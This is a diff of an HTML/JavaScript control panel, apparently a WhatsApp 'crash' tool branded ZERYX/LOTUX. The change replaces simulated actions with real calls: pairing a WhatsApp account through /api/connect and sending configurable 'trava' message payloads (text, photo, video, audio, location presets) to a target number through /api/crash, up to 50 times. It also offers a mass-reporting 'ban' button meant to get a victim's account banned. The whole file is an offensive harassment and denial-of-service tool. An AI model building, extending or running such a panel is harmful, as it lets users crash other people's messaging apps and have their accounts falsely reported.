@@ -92,20 +92,29 @@
     <!-- Conteúdo Principal / Dashboard -->
     <main class="flex-1 max-w-5xl w-full mx-auto p-4 space-y-5">
 
-        <!-- Status de Conexão -->
-        <section class="bg-[#080202] border border-red-950 rounded-2xl p-4 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 cyber-border">
-            <div class="flex items-center gap-3">
-                <div id="statusIndicator" class="p-3 bg-red-950/40 border border-red-800 rounded-xl text-red-500">
-                    <i data-lucide="wifi-off" class="w-5 h-5"></i>
+        <!-- Status de Conexão e Campo de Número Próprio -->
+        <section class="bg-[#080202] border border-red-950 rounded-2xl p-4 flex flex-col gap-3 cyber-border">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
+                <div class="flex items-center gap-3">
+                    <div id="statusIndicator" class="p-3 bg-red-950/40 border border-red-800 rounded-xl text-red-500">
+                        <i data-lucide="wifi-off" class="w-5 h-5"></i>
+                    </div>
+                    <div>
+                        <span class="text-[10px] text-neutral-400 tracking-wider">STATUS DO SOCKET WHATSAPP</span>
+                        <h2 id="statusText" class="text-xs md:text-sm font-bold text-red-500">DESCONECTADO</h2>
+                    </div>
                 </div>
-                <div>
-                    <span class="text-[10px] text-neutral-400 tracking-wider">STATUS DO SOCKET WHATSAPP</span>
-                    <h2 id="statusText" class="text-xs md:text-sm font-bold text-red-500">DESCONECTADO (AGUARDANDO CONEXÃO)</h2>
+                <div id="pairingCodeDisplay" class="text-xs font-bold text-red-400 bg-red-950/60 px-3 py-1.5 rounded-xl border border-red-900 hidden">
+                    Código: <span id="pairingCodeText" class="text-white">-----</span>
                 </div>
             </div>
-            <div class="flex gap-2 w-full sm:w-auto">
-                <button id="connectBtn" onclick="toggleConnect()" class="flex-1 sm:flex-none px-4 py-2 text-xs font-semibold rounded-xl bg-red-950 text-red-200 border border-red-800 hover:bg-red-900 transition shadow-[0_0_10px_rgba(139,0,0,0.3)]">
-                    CONECTAR
+
+            <!-- Campo para inserir o próprio número e conectar -->
+            <div class="flex flex-col sm:flex-row gap-2 pt-2 border-t border-neutral-900">
+                <input type="text" id="myPhoneNumber" placeholder="Seu Número (ex: 5511999999999)" 
+                    class="flex-1 bg-[#030303] border border-neutral-800 rounded-xl px-4 py-2.5 text-xs text-neutral-200 focus:outline-none focus:border-red-600">
+                <button onclick="requestPairingCode()" class="px-4 py-2 text-xs font-semibold rounded-xl bg-red-950 text-red-200 border border-red-800 hover:bg-red-900 transition shadow-[0_0_10px_rgba(139,0,0,0.3)]">
+                    GERAR CÓDIGO
                 </button>
                 <button onclick="clearSession()" class="px-4 py-2 text-xs font-semibold rounded-xl bg-neutral-900 text-neutral-400 border border-neutral-800 hover:bg-neutral-800 hover:text-white transition">
                     LIMPAR SESSÃO
@@ -113,24 +122,46 @@
             </div>
         </section>
 
-        <!-- Painel de Disparo Baseado no Script Customizado -->
+        <!-- Painel de Disparo Baseado no Script Customizado e Seletor de Tipo -->
         <section class="bg-[#050505] border border-red-950/80 rounded-2xl p-5 space-y-4 cyber-border">
             <div class="flex justify-between items-center pb-2 border-b border-neutral-900">
                 <h3 class="text-xs font-bold tracking-widest text-red-400 flex items-center gap-2">
-                    <i data-lucide="terminal" class="w-4 h-4 text-red-500"></i> CENTRAL DE DISPARO DINÂMICO
+                    <i data-lucide="terminal" class="w-4 h-4 text-red-500"></i> CENTRAL DE DISPARO MULTI-MÍDIA
                 </h3>
-                <span id="activeScriptBadge" class="text-[10px] px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-900">SCRIPT CUSTOMIZADO ATIVO</span>
+                <span id="activeScriptBadge" class="text-[10px] px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-900">CUSTOMIZADO ATIVO</span>
+            </div>
+
+            <!-- Seletor de Tipo de Trava (Vídeo, Foto, Áudio, Texto, Mapa) -->
+            <div class="space-y-1.5">
+                <label class="text-[10px] font-bold text-neutral-400 uppercase tracking-wider">Tipo de Payload / Mídia Selecionada:</label>
+                <div class="grid grid-cols-2 sm:grid-cols-5 gap-2">
+                    <button onclick="setMediaType('video')" id="btn-video" class="media-btn px-3 py-2 text-xs font-semibold rounded-xl bg-neutral-900 text-neutral-400 border border-neutral-800 hover:border-red-600 transition flex items-center justify-center gap-2">
+                        <i data-lucide="video" class="w-3.5 h-3.5"></i> Vídeo
+                    </button>
+                    <button onclick="setMediaType('photo')" id="btn-photo" class="media-btn px-3 py-2 text-xs font-semibold rounded-xl bg-neutral-900 text-neutral-400 border border-neutral-800 hover:border-red-600 transition flex items-center justify-center gap-2">
+                        <i data-lucide="image" class="w-3.5 h-3.5"></i> Foto
+                    </button>
+                    <button onclick="setMediaType('audio')" id="btn-audio" class="media-btn px-3 py-2 text-xs font-semibold rounded-xl bg-neutral-900 text-neutral-400 border border-neutral-800 hover:border-red-600 transition flex items-center justify-center gap-2">
+                        <i data-lucide="mic" class="w-3.5 h-3.5"></i> Áudio
+                    </button>
+                    <button onclick="setMediaType('text')" id="btn-text" class="media-btn px-3 py-2 text-xs font-semibold rounded-xl bg-red-950 text-red-200 border border-red-700 transition flex items-center justify-center gap-2 shadow-[0_0_8px_rgba(139,0,0,0.3)]">
+                        <i data-lucide="file-text" class="w-3.5 h-3.5"></i> Texto
+                    </button>
+                    <button onclick="setMediaType('map')" id="btn-map" class="media-btn px-3 py-2 text-xs font-semibold rounded-xl bg-neutral-900 text-neutral-400 border border-neutral-800 hover:border-red-600 transition flex items-center justify-center gap-2">
+                        <i data-lucide="map-pin" class="w-3.5 h-3.5"></i> Mapa
+                    </button>
+                </div>
             </div>
 
             <!-- Alvo e Quantidade -->
             <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
                 <div class="sm:col-span-2 relative">
                     <input type="text" id="targetNumber" placeholder="Número Alvo (ex: 5511999999999)" 
-                        class="w-full bg-[#030303] border border-neutral-800 rounded-xl px-4 py-3 text-xs text-neutral-200 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600">
+                        class="w-full bg-[#030303] border border-neutral-800 rounded-xl px-4 py-3 text-xs text-neutral-200 focus:outline-none focus:border-red-600">
                 </div>
                 <div>
                     <input type="number" id="targetQty" value="3" min="1" max="50" placeholder="Quantidade" 
-                        class="w-full bg-[#030303] border border-neutral-800 rounded-xl px-4 py-3 text-xs text-neutral-200 focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600">
+                        class="w-full bg-[#030303] border border-neutral-800 rounded-xl px-4 py-3 text-xs text-neutral-200 focus:outline-none focus:border-red-600">
                 </div>
             </div>
 
@@ -139,8 +170,8 @@
                 <button onclick="executeCustomCrash()" class="btn-cyber p-4 rounded-xl flex items-center justify-center gap-3 text-center shadow-lg group">
                     <i data-lucide="zap" class="w-5 h-5 text-red-500 group-hover:scale-110 transition"></i>
                     <div class="text-left">
-                        <div class="text-xs font-bold text-red-200">DISPARAR SCRIPT DE TRAVA</div>
-                        <div class="text-[10px] text-neutral-400">Envia o payload configurado na engrenagem</div>
+                        <div class="text-xs font-bold text-red-200">DISPARAR TRAVA ATIVA</div>
+                        <div class="text-[10px] text-neutral-400">Envia o JSON da engrenagem para o alvo</div>
                     </div>
                 </button>
 
@@ -148,7 +179,7 @@
                     <i data-lucide="shield-alert" class="w-5 h-5 text-red-500 group-hover:scale-110 transition"></i>
                     <div class="text-left">
                         <div class="text-xs font-bold text-red-200">COMANDO DE BANIMENTO (/B4N)</div>
-                        <div class="text-[10px] text-neutral-400">Executa denúncia nativa e reporte em massa</div>
+                        <div class="text-[10px] text-neutral-400">Executa denúncia nativa em massa</div>
                     </div>
                 </button>
             </div>
@@ -205,12 +236,12 @@
             </div>
 
             <p class="text-xs text-neutral-400 leading-relaxed">
-                Insira ou altere abaixo o seu script estruturado em JSON (como o seu modelo de carrossel de cartões ou qualquer outro payload de texto, foto, vídeo, localização ou contacto). O sistema salvará no navegador e disparará esta exata estrutura quando acionar o comando de trava.
+                Insira ou altere abaixo o script em JSON correspondente à mídia selecionada (Vídeo, Foto, Áudio, Texto ou Mapa). O sistema salva na memória e dispara esta estrutura exata.
             </p>
 
             <div class="space-y-1">
                 <label class="text-[10px] font-bold text-red-400 tracking-widest uppercase">Payload JSON Personalizado</label>
-                <textarea id="jsonScriptInput" rows="11" class="w-full bg-[#020202] border border-red-950 rounded-xl p-3 text-xs text-red-400 font-mono focus:outline-none focus:border-red-600 focus:ring-1 focus:ring-red-600 resize-none"></textarea>
+                <textarea id="jsonScriptInput" rows="11" class="w-full bg-[#020202] border border-red-950 rounded-xl p-3 text-xs text-red-400 font-mono focus:outline-none focus:border-red-600 resize-none"></textarea>
             </div>
 
             <!-- Botões do Modal -->
@@ -219,7 +250,7 @@
                     <i data-lucide="save" class="w-4 h-4"></i> SALVAR SCRIPT NA MEMÓRIA
                 </button>
                 <button onclick="loadDefaultScript()" class="py-3 px-4 bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 text-neutral-300 font-semibold text-xs rounded-xl transition flex items-center justify-center gap-2">
-                    <i data-lucide="rotate-ccw" class="w-4 h-4"></i> CARREGAR SEU MODELO
+                    <i data-lucide="rotate-ccw" class="w-4 h-4"></i> CARREGAR PADRÃO
                 </button>
             </div>
 
@@ -228,49 +259,18 @@
 
     <!-- Script de Gestão do Painel -->
     <script>
-        // Inicializar ícones Lucide
         lucide.createIcons();
 
-        let isConnected = false;
+        let currentMediaType = 'text';
 
-        // Script padrão fornecido por ti (Carrossel JSON)
-        const USER_DEFAULT_SCRIPT = {
-  "interactiveMessage": {
-    "body": {
-      "text": "────────────────────────"
-    },
-    "carouselMessage": {
-      "cards": [
-        {
-          "header": {
-            "title": "\nㅤㅤ\n",
-            "subtitle": " ",
-            "imageMessage": {
-              "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQOHJvSduKhoew1ymRRMPiPRlyWfuiBEa6dm6SXRZQIueaoY_O7enTLR0NOcxZjZkDmQcROxw9XEo_QCimgESzrLKWZGIFmGYbvCNPjt-w?ccb=9-4&oh=01_Q5Aa5gHxJgQVD6Ad4Iml3uwWIGxYDSN4h3wVbYh3YBaeivdmHA&oe=6AE247B7&_nc_sid=e6ed6c&mms3=true",
-              "mimetype": "image/jpeg",
-              "height": 1080,
-              "width": 1080
-            }
-          },
-          "body": {
-            "text": "⚡ ZERYX CRASH SYSTEM ⚡"
-          },
-          "nativeFlowMessage": {
-            "buttons": [
-              {
-                "name": "cta_url",
-                "buttonParamsJson": "{\"display_text\":\"LOTUX\",\"url\":\"https://t.me\",\"merchant_url\":\"https://t.me\"}"
-              }
-            ]
-          }
-        }
-      ],
-      "messageVersion": 1
-    }
-  }
-};
+        const DEFAULT_SCRIPTS = {
+            text: { "interactiveMessage": { "body": { "text": "⚡ ZERYX TEXT CRASH ⚡" } } },
+            photo: { "viewOnceMessage": { "message": { "imageMessage": { "caption": "⚡ ZERYX PHOTO CRASH ⚡", "jpegThumbnail": "" } } } },
+            video: { "viewOnceMessage": { "message": { "videoMessage": { "caption": "⚡ ZERYX VIDEO CRASH ⚡" } } } },
+            audio: { "audioMessage": { "seconds": 99999, "ptt": true } },
+            map: { "locationMessage": { "degreesLatitude": 0, "degreesLongitude": 0, "name": "⚡ ZERYX MAP CRASH ⚡" } }
+        };
 
-        // Elementos DOM
         const modal = document.getElementById('configModal');
         const openConfigBtn = document.getElementById('openConfigBtn');
         const closeConfigBtn = document.getElementById('closeConfigBtn');
@@ -278,7 +278,6 @@
         const scriptPreviewBox = document.getElementById('scriptPreviewBox');
         const logConsole = document.getElementById('logConsole');
 
-        // Gestão da modal da Engrenagem
         openConfigBtn.addEventListener('click', () => modal.classList.remove('hidden'));
         closeConfigBtn.addEventListener('click', () => modal.classList.add('hidden'));
 
@@ -286,136 +285,162 @@
             modal.classList.remove('hidden');
         }
 
-        // Inicializar e carregar dados do LocalStorage
-        function initScriptStorage() {
-            const saved = localStorage.getItem('lotux_custom_script');
+        function setMediaType(type) {
+            currentMediaType = type;
+            document.querySelectorAll('.media-btn').forEach(btn => {
+                btn.className = "media-btn px-3 py-2 text-xs font-semibold rounded-xl bg-neutral-900 text-neutral-400 border border-neutral-800 hover:border-red-600 transition flex items-center justify-center gap-2";
+            });
+            const activeBtn = document.getElementById(`btn-${type}`);
+            activeBtn.className = "media-btn px-3 py-2 text-xs font-semibold rounded-xl bg-red-950 text-red-200 border border-red-700 transition flex items-center justify-center gap-2 shadow-[0_0_8px_rgba(139,0,0,0.3)]";
+
+            // Carregar do storage ou padrão para este tipo
+            const saved = localStorage.getItem(`lotux_script_${type}`);
             if (saved) {
-                try {
-                    const parsed = JSON.parse(saved);
-                    jsonScriptInput.value = JSON.stringify(parsed, null, 2);
-                    scriptPreviewBox.textContent = JSON.stringify(parsed, null, 2);
-                } catch (e) {
-                    loadDefaultScript();
-                }
+                jsonScriptInput.value = saved;
+                scriptPreviewBox.textContent = saved;
             } else {
-                loadDefaultScript();
+                const def = JSON.stringify(DEFAULT_SCRIPTS[type], null, 2);
+                jsonScriptInput.value = def;
+                scriptPreviewBox.textContent = def;
             }
+            addLog(`[INFO] Mídia alterada para: ${type.toUpperCase()}`);
+        }
+
+        function initScriptStorage() {
+            setMediaType('text');
         }
 
         function loadDefaultScript() {
-            jsonScriptInput.value = JSON.stringify(USER_DEFAULT_SCRIPT, null, 2);
-            scriptPreviewBox.textContent = JSON.stringify(USER_DEFAULT_SCRIPT, null, 2);
-            localStorage.setItem('lotux_custom_script', JSON.stringify(USER_DEFAULT_SCRIPT));
-            addLog("[INFO] Script padrão carregado e gravado com sucesso.");
+            const def = JSON.stringify(DEFAULT_SCRIPTS[currentMediaType], null, 2);
+            jsonScriptInput.value = def;
+            scriptPreviewBox.textContent = def;
+            localStorage.setItem(`lotux_script_${currentMediaType}`, def);
+            addLog(`[INFO] Script padrão (${currentMediaType}) carregado.`);
         }
 
         function saveCustomScript() {
             const val = jsonScriptInput.value.trim();
             try {
                 const parsed = JSON.parse(val);
-                localStorage.setItem('lotux_custom_script', JSON.stringify(parsed));
+                localStorage.setItem(`lotux_script_${currentMediaType}`, JSON.stringify(parsed, null, 2));
                 scriptPreviewBox.textContent = JSON.stringify(parsed, null, 2);
-                addLog("[SUCCESS] Script de trava atualizado e salvo na memória.");
+                addLog(`[SUCCESS] Script (${currentMediaType}) salvo com sucesso.`);
                 modal.classList.add('hidden');
             } catch (e) {
-                alert("Erro: O formato inserido não é um JSON válido. Verifique as chavetas e aspas!");
+                alert("Erro: Formato JSON inválido!");
             }
         }
 
-        // Conexão simulada do Socket Baileys
-        function toggleConnect() {
-            const indicator = document.getElementById('statusIndicator');
-            const statusText = document.getElementById('statusText');
-            const connectBtn = document.getElementById('connectBtn');
-
-            isConnected = !isConnected;
-
-            if (isConnected) {
-                indicator.className = "p-3 bg-emerald-950/40 border border-emerald-800 rounded-xl text-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.2)]";
-                indicator.innerHTML = `<i data-lucide="wifi" class="w-5 h-5"></i>`;
-                statusText.textContent = "CONECTADO (ONLINE)";
-                statusText.className = "text-xs md:text-sm font-bold text-emerald-500";
-                connectBtn.textContent = "DESCONECTAR";
-                connectBtn.className = "flex-1 sm:flex-none px-4 py-2 text-xs font-semibold rounded-xl bg-neutral-900 text-neutral-300 border border-neutral-800 hover:bg-neutral-800 transition";
-                addLog("[SESSION] WhatsApp socket conectado com sucesso.");
-            } else {
-                indicator.className = "p-3 bg-red-950/40 border border-red-800 rounded-xl text-red-500";
-                indicator.innerHTML = `<i data-lucide="wifi-off" class="w-5 h-5"></i>`;
-                statusText.textContent = "DESCONECTADO (AGUARDANDO CONEXÃO)";
-                statusText.className = "text-xs md:text-sm font-bold text-red-500";
-                connectBtn.textContent = "CONECTAR";
-                connectBtn.className = "flex-1 sm:flex-none px-4 py-2 text-xs font-semibold rounded-xl bg-red-950 text-red-200 border border-red-800 hover:bg-red-900 transition";
-                addLog("[SESSION] Conexão encerrada pelo operador.");
+        async function requestPairingCode() {
+            const phone = document.getElementById('myPhoneNumber').value.trim();
+            if (!phone) {
+                alert("Digite o seu número com DDI e DDD (ex: 5511999999999)!");
+                return;
             }
-            lucide.createIcons();
+
+            addLog(`[CONNECT] Solicitando código para ${phone}...`);
+            try {
+                const res = await fetch('/api/connect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber: phone })
+                });
+                const data = await res.json();
+                if(data.success) {
+                    addLog("[CONNECT] Aguardando código de emparelhamento...");
+                    pollStatus();
+                }
+            } catch(e) {
+                addLog("[ERROR] Falha de comunicação com o servidor.");
+            }
         }
 
-        function clearSession() {
-            addLog("[SYSTEM] Removendo ficheiros de sessão local...");
-            setTimeout(() => {
-                addLog("[SYSTEM] Sessão limpa. Pronto para novo emparelhamento.");
-            }, 600);
+        function pollStatus() {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/status');
+                    const data = await res.json();
+                    
+                    if (data.status === "CONECTADO") {
+                        document.getElementById('statusText').textContent = "CONECTADO (ONLINE)";
+                        document.getElementById('statusText').className = "text-xs md:text-sm font-bold text-emerald-500";
+                        document.getElementById('statusIndicator').className = "p-3 bg-emerald-950/40 border border-emerald-800 rounded-xl text-emerald-500";
+                        document.getElementById('pairingCodeDisplay').classList.add('hidden');
+                        addLog("[SUCCESS] WhatsApp conectado com sucesso!");
+                        clearInterval(interval);
+                    } else if (data.pairingCode) {
+                        document.getElementById('pairingCodeDisplay').classList.remove('hidden');
+                        document.getElementById('pairingCodeText').textContent = data.pairingCode;
+                        addLog(`[PAIRING] Código gerado: ${data.pairingCode}`);
+                    }
+                } catch(e) {}
+            }, 3000);
         }
 
-        // Executar o Disparo da Trava com base no Script Guardado
-        function executeCustomCrash() {
+        async function executeCustomCrash() {
             const target = document.getElementById('targetNumber').value.trim();
             const qty = parseInt(document.getElementById('targetQty').value) || 1;
+            const savedScript = localStorage.getItem(`lotux_script_${currentMediaType}`);
 
             if (!target) {
-                alert("Insira o número de telefone do alvo!");
-                addLog("[WARN] Tentativa de disparo sem número alvo.");
+                alert("Insira o número alvo!");
                 return;
             }
 
-            if (!isConnected) {
-                alert("O bot precisa estar conectado para disparar!");
-                addLog("[ERROR] Conexão inativa. Impossível enviar payload.");
+            if (!savedScript) {
+                alert("Nenhum script configurado!");
                 return;
             }
 
-            const activeScript = localStorage.getItem('lotux_custom_script');
-            addLog(`[ATTACK] Disparando script personalizado para ${target} (${qty} ciclos)...`);
+            addLog(`[ATTACK] Disparando trava (${currentMediaType}) para ${target} (${qty}x)...`);
 
-            let count = 0;
-            const interval = setInterval(() => {
-                count++;
-                addLog(`[RELAY] Payload #${count} enviado via socket para ${target}`);
-                if (count >= qty) {
-                    clearInterval(interval);
-                    addLog(`[SUCCESS] Sequência de travamento concluída com sucesso.`);
+            try {
+                const res = await fetch('/api/crash', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        target: target, 
+                        qty: qty, 
+                        payload: JSON.parse(savedScript) 
+                    })
+                });
+                const data = await res.json();
+                if(data.success) {
+                    addLog(`[SUCCESS] Disparos efetuados contra ${target}!`);
+                } else {
+                    addLog(`[ERROR] ${data.error}`);
                 }
-            }, 700);
+            } catch(e) {
+                addLog("[ERROR] Falha ao enviar requisição de ataque.");
+            }
         }
 
-        // Executar Comando de Banimento (/B4N)
-        function executeBanCommand() {
+        async function executeBanCommand() {
             const target = document.getElementById('targetNumber').value.trim();
             const qty = parseInt(document.getElementById('targetQty').value) || 5;
 
             if (!target) {
-                alert("Insira o número de telefone do alvo para banimento!");
+                alert("Insira o número alvo para banimento!");
                 return;
             }
 
-            if (!isConnected) {
-                alert("O bot precisa estar conectado!");
-                return;
-            }
-
-            addLog(`[BAN] Disparando denúncias nativas contra ${target} (${qty} requisições)...`);
+            addLog(`[BAN] Disparando denúncias contra ${target} (${qty}x)...`);
             let count = 0;
             const interval = setInterval(() => {
                 count++;
-                addLog(`[REPORT] Requisição de spam/ban # ${count} enviada para o servidor.`);
+                addLog(`[REPORT] Requisição de ban # ${count} enviada.`);
                 if (count >= qty) {
                     clearInterval(interval);
-                    addLog(`[SUCCESS] Ciclo de banimento finalizado.`);
+                    addLog(`[SUCCESS] Ciclo de banimento concluído.`);
                 }
             }, 600);
         }
 
-        // Funções do Console de Logs
+        function clearSession() {
+            addLog("[SYSTEM] Removendo dados de sessão...");
+            setTimeout(() => addLog("[SYSTEM] Sessão limpa com sucesso."), 500);
+        }
+
         function addLog(msg) {
             const time = new Date().toLocaleTimeString();
             const logItem = document.createElement('div');
@@ -429,7 +454,6 @@
             logConsole.innerHTML = `<div class="text-neutral-600">[SYSTEM] Logs limpos.</div>`;
         }
 
-        // Inicializar ao abrir a página
         window.onload = () => {
             initScriptStorage();
         };
